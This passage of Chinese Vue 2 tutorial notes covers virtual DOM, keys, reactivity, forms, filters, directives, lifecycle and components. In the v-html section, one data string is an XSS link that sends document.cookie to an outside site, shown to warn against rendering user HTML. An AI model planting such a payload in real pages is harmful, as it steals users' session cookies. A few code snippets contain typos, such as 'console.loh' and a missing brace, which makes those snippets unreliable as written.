 * @param {Object} props - dom 属性
 * @param {Array<Element|String>} - 子节点
 */
function Element(tagName, props, children) {
    this.tagName = tagName;
    this.props = props;
    this.children = children;
    // dom 元素的 key 值，用作唯一标识符
    if (props.key) {
        this.key = props.key
    }
}
function el(tagName, props, children) {
    return new Element(tagName, props, children);
}
```

构建虚拟的  `DOM`  ，用 javascript 对象来表示

```js
let ul = el('div', { id: 'Virtual DOM' }, [
    el('p', {}, ['Virtual DOM']),
    el('ul', { id: 'list' }, [
        el('li', { class: 'item' }, ['Item 1']),
        el('li', { class: 'item' }, ['Item 2']),
        el('li', { class: 'item' }, ['Item 3'])
    ]),
    el('div', {}, ['Hello, World'])
])
```

现在 `ul` 就是我们用 `JavaScript` 对象表示的 `DOM` 结构，我们输出查看 `ul` 对应的数据结构如下：

![image-20220323130142449](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220323130142449.png)

**（2）**将用 js 对象表示的虚拟 DOM 转换成真实 DOM：需要用到 js 原生操作 DOM 的方法。

```js
/**
 * render 将virdual-dom 对象渲染为实际 DOM 元素
 */
Element.prototype.render = function () {
    // 创建节点
    let el = document.createElement(this.tagName);

    let props = this.props;
    // 设置节点的 DOM 属性
    for (let propName in props) {
        let propValue = props[propName];
        el.setAttribute(propName, propValue)
    }

    let children = this.children || []
    for (let child of children) {
        let childEl = (child instanceof Element)
        ? child.render() // 如果子节点也是虚拟 DOM, 递归构建 DOM 节点
        : document.createTextNode(child) // 如果是文本，就构建文本节点

        el.appendChild(childEl);
    }

    return el;
}
```

我们通过查看以上 `render` 方法，会根据 `tagName` 构建一个真正的 `DOM` 节点，然后设置这个节点的属性，最后递归地把自己的子节点也构建起来。

我们将构建好的 `DOM` 结构添加到页面 `body` 上面，如下：

```js
let ulRoot = ul.render();
document.body.appendChild(ulRoot);
```

这样，页面 `body` 里面就有真正的 `DOM` 结构，效果如下图所示：

![image-20220323130544065](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220323130544065.png)



> 我们知道虚拟 DOM 的好处和虚拟 DOM 的实现后就要讲讲 key 的作用了。
>
> 贴一下上面实现地完整代码

```js
<script>
    /**
         * Element virdual-dom 对象定义
         * @param {String} tagName - dom 元素名称
         * @param {Object} props - dom 属性
         * @param {Array<Element|String>} - 子节点
         */
    function Element(tagName, props, children) {
        this.tagName = tagName;
        this.props = props;
        this.children = children;
        // dom 元素的 key 值，用作唯一标识符
        if (props.key) {
            this.key = props.key
        }
    }

    function el(tagName, props, children) {
        return new Element(tagName, props, children);
    }

    let ul = el('div', { id: 'Virtual DOM' }, [
        el('p', {}, ['Virtual DOM']),
        el('ul', { id: 'list' }, [
            el('li', { class: 'item' }, ['Item 1']),
            el('li', { class: 'item' }, ['Item 2']),
            el('li', { class: 'item' }, ['Item 3'])
        ]),
        el('div', {}, ['Hello, World'])
    ])

    /**
             * render 将virdual-dom 对象渲染为实际 DOM 元素
             */
    Element.prototype.render = function () {
        // 创建节点
        let el = document.createElement(this.tagName);

        let props = this.props;
        // 设置节点的 DOM 属性
        for (let propName in props) {
            let propValue = props[propName];
            el.setAttribute(propName, propValue)
        }

        let children = this.children || []
        for (let child of children) {
            let childEl = (child instanceof Element)
            ? child.render() // 如果子节点也是虚拟 DOM, 递归构建 DOM 节点
            : document.createTextNode(child) // 如果是文本，就构建文本节点

            el.appendChild(childEl);
        }

        return el;
    }

    let ulRoot = ul.render();
    document.body.appendChild(ulRoot);
    console.log(ul);
</script>
```







#### **虚拟DOM中key的作用**

key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：

* 旧虚拟DOM中找到了与新虚拟DOM相同的key：
  * ①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！
  * ②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。
* 旧虚拟DOM中未找到与新虚拟DOM相同的key
  * 创建新的真实DOM，随后渲染到到页面。



> 好了，我们知道了最简单的key的原理，如果要继续研究下去就要涉及到vue的核心之一-Diff算法，后面会详细介绍。



### 用index作为key可能会引发的问题：

**若对数据进行：逆序添加、逆序删除等破坏顺序操作：**

会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。



> 案例

```vue
<!-- 准备好一个容器-->
<div id="root">
    <!-- 遍历数组 -->
    <h2>人员列表（遍历数组）</h2>
    <button @click.once="add">添加一个老刘</button>
    <ul>
        <li v-for="(p,index) of persons" :key="index">
            {{p.name}}-{{p.age}}
            <input type="text">
        </li>
    </ul>
</div>

<script type="text/javascript">
	Vue.config.productionTip = false

	new Vue({
		el: '#root',
		data: {
			persons: [
				{ id: '001', name: '张三', age: 18 },
				{ id: '002', name: '李四', age: 19 },
				{ id: '003', name: '王五', age: 20 }
			]
		},
		methods: {
			add() {
				const p = { id: '004', name: '老刘', age: 40 }
				this.persons.unshift(p)
			}
		},
	});
</script>
```

> 解释：

初始数据

persons: [
		{ id: '001', name: '张三', age: 18 },
		{ id: '002', name: '李四', age: 19 },
		{ id: '003', name: '王五', age: 20 }
]

**vue根据数据生成虚拟 DOM**

初始虚拟 DOM 

```html
<li key='0'>张三-18<input type="text"></li>
<li key='1'>李四-19<input type="text"></li>
<li key='2'>王五-20<input type="text"></li>
```

**将虚拟 DOM 转为 真实 DOM** 

![image-20220326153628779](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220326153628779.png)

`this.persons.unshift({ id: '004', name: '老刘', age: 40 })`

在 persons 数组最前面添加上 { id: '004', name: '老刘', age: 40 }

新数据：

persons: [

​		{ id: '004', name: '老刘', age: 40 },

​		{ id: '001', name: '张三', age: 18 },
​		{ id: '002', name: '李四', age: 19 },
​		{ id: '003', name: '王五', age: 20 }
]

**vue根据数据生成虚拟 DOM**

新虚拟 DOM

```html
<li key='0'>老刘-30<input type="text"></li>
<li key='1'>张三-18<input type="text"></li>
<li key='3'>李四-19<input type="text"></li>
<li key='4'>王五-20<input type="text"></li>
```

**将虚拟 DOM 转为 真实 DOM** 

![image-20220326154022144](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220326154022144.png)



因为老刘被插到第一个，重刷了 key 的值，vue Diff 算法 根据 key 的值 判断 虚拟DOM 全部发生了改变，然后全部重新生成新的 真实 DOM。实际上，张三，李四，王五并没有发生更改，是可以直接复用之前的真实 DOM，而因为 key 的错乱，导致要全部重新生成，造成了性能的浪费。

> 来张尚硅谷的图

![key的原理2](C:\Users\28318\Desktop\vue\vue_basic\12_列表渲染\key的原理2.png)



**如果结构中还包含输入类的DOM：**

会产生错误DOM更新 ==> 界面有问题。

> 这回造成的就不是性能浪费了，会直接导致页面的错误

![image-20220326154707588](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220326154707588.png)



### 结论：

* 最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值
* 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的



> 来张尚硅谷的图，正经使用 key

![key的原理1](C:\Users\28318\Desktop\vue\vue_basic\12_列表渲染\key的原理1.png)





## 1.14 vue 监测data 中的 数据

先来个案例引入一下：

```vue
<!-- 准备好一个容器-->
<div id="root">
    <h2>人员列表</h2>
    <button @click="updateMei">更新马冬梅的信息</button>
    <ul>
        <li v-for="(p,index) of persons" :key="p.id">
            {{p.name}}-{{p.age}}-{{p.sex}}
        </li>
    </ul> 
</div>

<script type="text/javascript">
    Vue.config.productionTip = false

    const vm = new Vue({
        el:'#root',
        data:{
            persons:[
                {id:'001',name:'马冬梅',age:30,sex:'女'},
                {id:'002',name:'周冬雨',age:31,sex:'女'},
                {id:'003',name:'周杰伦',age:18,sex:'男'},
                {id:'004',name:'温兆伦',age:19,sex:'男'}
            ]
        },
        methods: {
            updateMei(){
                // this.persons[0].name = '马老师' //奏效
                // this.persons[0].age = 50 //奏效
                // this.persons[0].sex = '男' //奏效
                this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} //不奏效
                // this.persons.splice(0,1,{id:'001',name:'马老师',age:50,sex:'男'})
            }
        }
    }) 

</script>
```

点击更新马冬梅的信息，马冬梅的数据并没有发生改变。

![image-20220326163110778](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220326163110778.png)

我们来看看控制台：

![image-20220326163230301](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220326163230301.png)

控制台上的数据发生了改变，说明，这个更改的数据并没有被 vue 监测到。

所以我们来研究一下 Vue 监测的原理。

我们先研究 Vue 如何监测 对象里的数据

> 代码

```vue
<!-- 准备好一个容器-->
<div id="root">
    <h2>学校名称：{{name}}</h2>
    <h2>学校地址：{{address}}</h2>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    const vm = new Vue({
        el:'#root',
        data:{
            name:'浙江师范大学',
            address:'金华',
            student:{
                name:'tom',
                age:{
                    rAge:40,
                    sAge:29,
                },
                friends:[
                    {name:'jerry',age:35}
                ]
            }
        }
    })
</script>
```

![image-20220326165342751](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220326165342751.png)

> 讲一下解析模板后面的操作---》调用 set 方法时，就会去解析模板----->生成新的虚拟 DOM----->新旧DOM 对比 -----> 更新页面

模拟一下 vue 中的 数据监测

```vue
<script type="text/javascript" >

    let data = {
        name:'尚硅谷',
        address:'北京',
    }

    //创建一个监视的实例对象，用于监视data中属性的变化
    const obs = new Observer(data)		
    console.log(obs)	

    //准备一个vm实例对象
    let vm = {}
    vm._data = data = obs

    function Observer(obj){
        //汇总对象中所有的属性形成一个数组
        const keys = Object.keys(obj)
        //遍历
        keys.forEach((k) => {
            Object.defineProperty(this, k, {
                get() {
                    return obj[k]
                },
                set(val) {
                    console.log(`${k}被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了`)
                    obj[k] = val
                }
            })
        })
    }
</script>
```

![image-20220326184000838](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220326184000838.png)

**Vue.set 的使用**

Vue.set(target，propertyName/index，value) 或

vm.$set(target，propertyName/index，value)

**用法**：

向响应式对象中添加一个 property，并确保这个新 property 同样是响应式的，且触发视图更新。它必须用于向响应式对象上添加新 property，因为 Vue 无法探测普通的新增 property (比如 `vm.myObject.newProperty = 'hi'`)

> 代码

```vue
<!-- 准备好一个容器-->
<div id="root">
    <h1>学生信息</h1>
    <button @click="addSex">添加性别属性，默认值：男</button> <br/>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    const vm = new Vue({
        el:'#root',
        data:{
            student:{
                name:'tom',
                age:18,
                hobby:['抽烟','喝酒','烫头'],
                friends:[
                    {name:'jerry',age:35},
                    {name:'tony',age:36}
                ]
            }
        },
        methods: {
            addSex(){
                // Vue.set(this.student,'sex','男')
                this.$set(this.student,'sex','男')
            }
        }
    })
</script>
```

Vue.set() 或 vm.$set 有缺陷：

![image-20220326190428396](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220326190428396.png)

> 就是 vm 和 _data 



看完了 vue 监测对象中的数据，再来看看 vue 如何监测 数组里的数据

> 先写个代码案例

```vue
<!-- 准备好一个容器-->
<div id="root">
    <h2>爱好</h2>
    <ul>
        <li v-for="(h,index) in student.hobby" :key="index">
            {{h}}
        </li>
    </ul>
    <h2>朋友们</h2>
    <ul>
        <li v-for="(f,index) in student.friends" :key="index">
            {{f.name}}--{{f.age}}
        </li>
    </ul>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    const vm = new Vue({
        el:'#root',
        data:
            student:{
                name:'tom',
                age:{
                    rAge:40,
                    sAge:29,
                },
                hobby:['抽烟','喝酒','烫头'],
                friends:[
                    {name:'jerry',age:35},
                    {name:'tony',age:36}
                ]
            }
        },
        methods: {
            
        }
    })
</script>
```

![image-20220326192837951](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220326192837951.png)

> 所以我们通过 vm._data.student.hobby[0] = 'aaa' // 不奏效
>
> vue 监测在数组那没有 getter 和 setter，所以监测不到数据的更改，也不会引起页面的更新

![image-20220326193108910](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220326193108910.png)

既然 vue 在对数组无法通过 getter 和 setter 进行数据监视，那 vue 到底如何监视数组数据的变化呢？

vue对数组的监测是通过 包装数组上常用的用于修改数组的方法来实现的。

vue官网的解释：

![image-20220326194203065](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220326194203065.png)

 **总结：**

Vue监视数据的原理：

* vue会监视data中所有层次的数据

* 如何监测对象中的数据？

  通过setter实现监视，且要在new Vue时就传入要监测的数据。

  * 对象中后追加的属性，Vue默认不做响应式处理

  * 如需给后添加的属性做响应式，请使用如下API：

    Vue.set(target，propertyName/index，value) 或 

    vm.$set(target，propertyName/index，value)

* 如何监测数组中的数据？

  通过包裹数组更新元素的方法实现，本质就是做了两件事：

  * 调用原生对应的方法对数组进行更新
  * 重新解析模板，进而更新页面

* 在Vue修改数组中的某个元素一定要用如下方法：

  * 使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
  * Vue.set() 或 vm.$set()



> 特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！



## 1.15 收集表单数据

若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。

```vue
<!-- 准备好一个容器-->
<div id="root">
    <form @submit.prevent="demo">
        账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
        密码：<input type="password" v-model="userInfo.password"> <br/><br/>
        年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
        <button>提交</button>
    </form>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false

    new Vue({
        el:'#root',
        data:{
            userInfo:{
                account:'',
                password:'',
                age:18,
            }
        },
        methods: {
            demo(){
                console.log(JSON.stringify(this.userInfo))
            }
        }
    })
</script>
```



若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。

```vue
<!-- 准备好一个容器-->
<div id="root">
    <form @submit.prevent="demo">
        性别：
        男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
        女<input type="radio" name="sex" v-model="userInfo.sex" value="female">
    </form>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false

    new Vue({
        el:'#root',
        data:{
            userInfo:{
                sex:'female'
            }
        },
        methods: {
            demo(){
                console.log(JSON.stringify(this.userInfo))
            }
        }
    })
</script>
```



若：<input type="checkbox"/>

* 没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
* 配置input的value属性:
  * v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
  * v-model的初始值是数组，那么收集的的就是value组成的数组



```vue
<!-- 准备好一个容器-->
<div id="root">
    <form @submit.prevent="demo">
        爱好：
        学习<input type="checkbox" v-model="userInfo.hobby" value="study">
        打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
        吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
        <br/><br/>
        所属校区
        <select v-model="userInfo.city">
            <option value="">请选择校区</option>
            <option value="beijing">北京</option>
            <option value="shanghai">上海</option>
            <option value="shenzhen">深圳</option>
            <option value="wuhan">武汉</option>
        </select>
        <br/><br/>
        其他信息：
        <textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
        <input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
        <button>提交</button>
    </form>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false

    new Vue({
        el:'#root',
        data:{
            userInfo:{
                hobby:[],
                city:'beijing',
                other:'',
                agree:''
            }
        },
        methods: {
            demo(){
                console.log(JSON.stringify(this.userInfo))
            }
        }
    })
</script>
```

![image-20220326200704357](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220326200704357.png)



> 备注：v-model的三个修饰符：
>
> lazy：失去焦点再收集数据
>
> number：输入字符串转为有效的数字
>
> trim：输入首尾空格过滤

## 1.16 过滤器（非重点）

定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。

**语法：**

* 注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{} }
* 使用过滤器：{ { xxx | 过滤器名} }  或  v-bind:属性 = "xxx | 过滤器名"



```vue
<!-- 准备好一个容器-->
<div id="root">
    <h2>显示格式化后的时间</h2>
    <!-- 计算属性实现 -->
    <h3>现在是：{{ fmtTime }}</h3>
    <!-- methods实现 -->
    <h3>现在是：{{ getFmtTime() }}</h3>
    <!-- 过滤器实现 -->
    <h3>现在是：{{time | timeFormater}}</h3>
    <!-- 过滤器实现（传参） -->
    <h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
    <h3 :x="msg | mySlice">尚硅谷</h3>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false
    //全局过滤器
    Vue.filter('mySlice',function(value){
        return value.slice(0,4)
    })

    new Vue({
        el:'#root',
        data:{
            time:1621561377603, //时间戳
            msg:'你好，尚硅谷'
        },
        computed: {
            fmtTime(){
                return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
            }
        },
        methods: {
            getFmtTime(){
                return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
            }
        },
        //局部过滤器
        filters:{
            timeFormater(value, str='YYYY年MM月DD日 HH:mm:ss'){
                // console.log('@',value)
                return dayjs(value).format(str)
            }
        }
    })
</script>
```



> 备注：
>
> 1.过滤器也可以接收额外参数、多个过滤器也可以串联
>
> 2.并没有改变原本的数据, 是产生新的对应的数据





## 1.17 内置指令

**v-text指令：**(使用的比较少)

1.作用：向其所在的节点中渲染文本内容。

2.与插值语法的区别：v-text会替换掉节点中的内容，{ {xx} }则不会。

```vue
<!-- 准备好一个容器-->
<div id="root">
    <div>你好，{{name}}</div>
    <div v-text="name"></div>
    <div v-text="str"></div>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            name:'张三',
            str:'<h3>你好啊！</h3>'
        }
    })
</script>
```

**v-html指令：**(使用的很少)

1.作用：向指定节点中渲染包含html结构的内容。

2.与插值语法的区别：

* v-html会替换掉节点中所有的内容，{ {xx} }则不会。
* v-html可以识别html结构。

3.严重注意：v-html有安全性问题！！！！

* 在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
* 一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！

```vue
<!-- 准备好一个容器-->
<div id="root">
    <div>你好，{{name}}</div>
    <div v-html="str"></div>
    <div v-html="str2"></div>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            name:'张三',
            str:'<h3>你好啊！</h3>',
            str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
        }
    })
</script>
```

**v-cloak指令（没有值）：**

* 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
* 使用css配合v-cloak可以解决网速慢时页面展示出{ {xxx} }的问题。

```vue
<style>
    [v-cloak]{
        display:none;
    }
</style>
<!-- 准备好一个容器-->
<div id="root">
    <h2 v-cloak>{{name}}</h2>
</div>
<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>

<script type="text/javascript">
    console.log(1)
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            name:'尚硅谷'
        }
    })
</script>
```

**v-once指令：**(用的少)

* v-once所在节点在初次动态渲染后，就视为静态内容了。
* 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。

```vue
<!-- 准备好一个容器-->
<div id="root">
    <h2 v-once>初始化的n值是:{{ n }}</h2>
    <h2>当前的n值是:{{ n }}</h2>
    <button @click="n++">点我n+1</button>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            n:1
        }
    })
</script>
```

**v-pre指令：**(比较没用)

* 跳过其所在节点的编译过程
* 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译

```vue
<!-- 准备好一个容器-->
<div id="root">
    <h2 v-pre>Vue其实很简单</h2>
    <h2 >当前的n值是:{{n}}</h2>
    <button @click="n++">点我n+1</button>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            n:1
        }
    })
</script>
```





## 1.18 自定义指令

需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。

需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。

**语法：**

局部指令：

```js
directives: {
  focus: {
    // 指令的定义
    inserted: function (el) {
      el.focus()
    }
  }
}
```

全局指令：

```vue
<script>
    // 注册一个全局自定义指令 `v-focus`
    Vue.directive('focus', {
        // 当被绑定的元素插入到 DOM 中时……
        inserted: function (el) {
            // 聚焦元素
            el.focus()
        }
    })
</script>
```

配置对象中常用的3个回调：

* bind：指令与元素成功绑定时调用。
* inserted：指令所在元素被插入页面时调用。
* update：指令所在模板结构被重新解析时调用。

> 理解这三个的调用时机，需要进一步了解 vue 的生命周期，下面会介绍。



定义全局指令

```vue
<!-- 准备好一个容器-->
<div id="root">
    <input type="text" v-fbind:value="n">
</div>

<script type="text/javascript">
    Vue.config.productionTip = false

    //定义全局指令
    Vue.directive('fbind', {
        // 指令与元素成功绑定时（一上来）
        bind(element, binding){
            element.value = binding.value
        },
        // 指令所在元素被插入页面时
        inserted(element, binding){
            element.focus()
        },
        // 指令所在的模板被重新解析时
        update(element, binding){
            element.value = binding.value
        }
    })
    
    new Vue({
        el:'#root',
        data:{
            name: '尚硅谷',
            n: 1
        }
    })

</script>
```



局部指令：

```js
new Vue({
    el: '#root',
    data: {
        name:'尚硅谷',
        n:1
    },
    directives: {
        // big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
        /* 'big-number'(element,binding){
					// console.log('big')
					element.innerText = binding.value * 10
				}, */
        big (element,binding){
            console.log('big',this) //注意此处的this是window
            // console.log('big')
            element.innerText = binding.value * 10
        },
        fbind: {
            //指令与元素成功绑定时（一上来）
            bind (element,binding){
                element.value = binding.value
            },
            //指令所在元素被插入页面时
            inserted (element,binding){
                element.focus()
            },
            //指令所在的模板被重新解析时
            update (element,binding){
                element.value = binding.value
            }
        }
    }
})
```



## 1.19 生命周期

### 简介生命周期

Vue 实例有⼀个完整的⽣命周期，也就是从new Vue()、初始化事件(.once事件)和生命周期、编译模版、挂载Dom -> 渲染、更新 -> 渲染、卸载 等⼀系列过程，称这是Vue的⽣命周期。 

先来一张尚硅谷的图：

![生命周期](C:\Users\28318\Desktop\vue\vue_basic\17_生命周期\生命周期.png)

1. **beforeCreate（创建前）**：数据监测(getter和setter)和初始化事件还未开始，此时 data 的响应式追踪、event/watcher 都还没有被设置，也就是说不能访问到data、computed、watch、methods上的方法和数据。
2. **created（创建后）**：实例创建完成，实例上配置的 options 包括 data、computed、watch、methods 等都配置完成，但是此时渲染得节点还未挂载到 DOM，所以不能访问到 `$el`属性。
3. **beforeMount（挂载前）**：在挂载开始之前被调用，相关的render函数首次被调用。此阶段Vue开始解析模板，生成虚拟DOM存在内存中，还没有把虚拟DOM转换成真实DOM，插入页面中。所以网页不能显示解析好的内容。
4. **mounted（挂载后）**：在el被新创建的 vm.$el（就是真实DOM的拷贝）替换，并挂载到实例上去之后调用（将内存中的虚拟DOM转为真实DOM，真实DOM插入页面）。此时页面中呈现的是经过Vue编译的DOM，这时在这个钩子函数中对DOM的操作可以有效，但要尽量避免。一般在这个阶段进行：开启定时器，发送网络请求，订阅消息，绑定自定义事件等等
5. **beforeUpdate（更新前）**：响应式数据更新时调用，此时虽然响应式数据更新了，但是对应的真实 DOM 还没有被渲染（数据是新的，但页面是旧的，页面和数据没保持同步呢）。
6. **updated（更新后）** ：在由于数据更改导致的虚拟DOM重新渲染和打补丁之后调用。此时 DOM 已经根据响应式数据的变化更新了。调用时，组件 DOM已经更新，所以可以执行依赖于DOM的操作。然而在大多数情况下，应该避免在此期间更改状态，因为这可能会导致更新无限循环。该钩子在服务器端渲染期间不被调用。
7. **beforeDestroy（销毁前）**：实例销毁之前调用。这一步，实例仍然完全可用，`this` 仍能获取到实例。在这个阶段一般进行关闭定时器，取消订阅消息，解绑自定义事件。
8. **destroyed（销毁后）**：实例销毁后调用，调用后，Vue 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁。该钩子在服务端渲染期间不被调用。



> 来讲一下图中间大框框的内容

![image-20220401171626729](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220401171626729.png)

先判断有没有 **el** 这个配置项，没有就调用 vm.$mount(el)，如果两个都没有就一直卡着，显示的界面就是最原始的容器的界面。有 **el** 这个配置项，就进行判断有没有 template 这个配置项，没有 template 就将 el 绑定的容器编译为 vue 模板，来个对比图。

没编译前的：

![image-20220401172054462](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220401172054462.png)

编译后：

![image-20220401172220994](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220401172220994.png)



这个 template 有啥用咧？

**第一种情况，有 template：**

如果 el 绑定的容器没有任何内容，就一个空壳子，但在 Vue 实例中写了 template，就会编译解析这个 template 里的内容，生成虚拟 DOM，最后将 虚拟 DOM 转为 真实 DOM 插入页面（其实就可以理解为 template 替代了 el 绑定的容器的内容）。

![image-20220401172847083](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220401172847083.png)

![image-20220401172859613](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220401172859613.png)



**第二种情况，没有 template：**

没有 template，就编译解析 el 绑定的容器，生成虚拟 DOM，后面就顺着生命周期执行下去。



## 1.20 非单文件组件

### 基本使用

Vue中使用组件的三大步骤：

* 定义组件(创建组件)
* 注册组件
* 使用组件(写组件标签)



**定义组件**

使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；

区别如下：

* el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
* data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。

讲解一下面试小问题：data必须写成函数：

这是 js 底层设计的原因：举个例子

> 对象形式

```js
let data = {
    a: 99,
    b: 100
}

let x = data;
let y = data;
// x 和 y 引用的都是同一个对象，修改 x 的值， y 的值也会改变
x.a = 66;
console.loh(x); // a:66 b:100
console.log(y); // a:66 b:100
```

> 函数形式

```js
function data() {
    return {
        a: 99,
        b: 100
    }
}
let x = data();
let y = data();
console.log(x === y); // false
// 我的理解是函数每调用一次就创建一个新的对象返回给他们
```

> 备注：使用template可以配置组件结构。

创建一个组件案例：Vue.extend() 创建

```vue
<script type="text/javascript">
    Vue.config.productionTip = false

    //第一步：创建school组件
    const school = Vue.extend({
        template:`
				<div class="demo">
					<h2>学校名称：{{schoolName}}</h2>
					<h2>学校地址：{{address}}</h2>
					<button @click="showName">点我提示学校名</button>	
    </div>
			`,
        // el:'#root', //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。
        data(){
            return {
                schoolName:'尚硅谷',
                address:'北京昌平'
            }
        },
        methods: {
            showName(){
                alert(this.schoolName)
            }
        },
    })

    //第一步：创建student组件
    const student = Vue.extend({
        template:`
				<div>
					<h2>学生姓名：{{studentName}}</h2>
					<h2>学生年龄：{{age}}</h2>
    </div>
			`,
        data(){
            return {
                studentName:'张三',
                age:18
            }
        }
    })

    //第一步：创建hello组件
    const hello = Vue.extend({
        template:`
				<div>	
					<h2>你好啊！{{name}}</h2>
    </div>
			`,
        data(){
            return {
                name:'Tom'
            }
        }
    })
</script>
```

**注册组件**

* 局部注册：靠new Vue的时候传入components选项
* 全局注册：靠Vue.component('组件名',组件)

> 局部注册

```vue
<script>
	//创建vm
    new Vue({
        el: '#root',
        data: {
            msg:'你好啊！'
        },
        //第二步：注册组件（局部注册）
        components: {
            school: school,
            student: student
            // ES6简写形式
            // school,
            // student
        }
    })
</script>
```

> 全局注册

```vue
<script>
	//第二步：全局注册组件
	Vue.component('hello', hello)
</script>
```

**写组件标签**

```vue
<!-- 准备好一个容器-->
<div id="root">
    <hello></hello>
    <hr>
    <h1>{{msg}}</h1>
    <hr>
    <!-- 第三步：编写组件标签 -->
    <school></school>
    <hr>
    <!-- 第三步：编写组件标签 -->
    <student></student>
</div>
```



### **几个注意点：**

关于组件名：

一个单词组成：

* 第一种写法(首字母小写)：school
* 第二种写法(首字母大写)：School

多个单词组成：

* 第一种写法(kebab-case命名)：my-school
* 第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)

>  备注：
>
> (1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。
>
> (2).可以使用name配置项指定组件在开发者工具中呈现的名字。





关于组件标签:

第一种写法：<school></school>

第二种写法：<school/>

> 备注：不用使用脚手架时，<school/>会导致后续组件不能渲染。



一个简写方式：

const school = Vue.extend(options) 可简写为：const school = options



### 组件的嵌套

比较简单，直接展示代码：

```vue
<!-- 准备好一个容器-->
<div id="root">

</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    //定义student组件
    const student = Vue.extend({
        name:'student',
        template:`
				<div>
					<h2>学生姓名：{{name}}</h2>	
					<h2>学生年龄：{{age}}</h2>	
    </div>
			`,
        data(){
            return {
                name:'尚硅谷',
                age:18
            }
        }
    })

    //定义school组件
    const school = Vue.extend({
        name:'school',
        template:`
